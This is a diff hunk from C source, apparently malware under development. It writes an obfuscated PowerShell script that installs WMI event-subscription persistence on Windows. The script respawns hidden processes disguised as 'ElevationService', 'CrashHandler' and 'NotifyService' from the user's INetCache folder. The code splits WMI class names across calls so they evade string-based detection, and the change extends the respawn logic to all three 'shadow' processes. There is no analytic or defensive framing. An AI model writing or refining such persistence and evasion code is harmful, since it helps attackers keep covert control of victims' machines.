@@ -681,15 +681,15 @@ void obf_sys_wmi_persistence(void) {
     if (!f) return;
     
     /* Obfuscated PowerShell with minimal suspicious strings.
-       Class names are split across fprintf calls so they don't appear
-       as contiguous substrings in the binary. */
+       The script checks if ANY of the 3 shadow processes are missing
+       and respawns them from the correct paths. */
     fprintf(f, "$e='SysHealth'; $f=$e+'Filter'; $c=$e+'Consumer'; ");
     fprintf(f, "Remove-WmiObject -N 'root/subscription' -C _");
     fprintf(f, "_EventFilter -F \"Name='$f'\" -EA SilentlyContinue; ");
     fprintf(f, "$fl=Set-WmiObject -C _");
     fprintf(f, "_EventFilter -N 'root/subscription' -A @{Name=$f;EventNamespace='root/cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA \"Win32_Process\"'}; ");
     fprintf(f, "$co=Set-WmiObject -C CommandLineEvent");
-    fprintf(f, "Consumer -N 'root/subscription' -A @{Name=$c;CommandLineTemplate='powershell.exe -NoP -W Hidden -C \"if (-not (gps | ?{$_.Name -match \"El.*Srv|Cr.*Hdl|Nt.*Srv\"})) { Start-Process \"$env:LOCALAPPDATA\\Microsoft\\Windows\\INetCache\\IE\\El.exe\" -A \"--shadow\" -W Hidden }\"'}; ");
+    fprintf(f, "Consumer -N 'root/subscription' -A @{Name=$c;CommandLineTemplate='powershell.exe -NoP -W Hidden -C \"$p=\"$env:LOCALAPPDATA\\Microsoft\\Windows\\INetCache\\IE\"; @(\"ElevationService\",\"CrashHandler\",\"NotifyService\") | %% { if (-not (gps -Name $_ -EA SilentlyContinue)) { Start-Process \"$p\\$_.exe\" -ArgumentList \"--shadow\" -WindowStyle Hidden } }\"'}; ");
     fprintf(f, "Set-WmiObject -C _");
     fprintf(f, "_FilterToConsumerBinding -N 'root/subscription' -A @{Filter=$fl;Consumer=$co}\n");
     fclose(f);
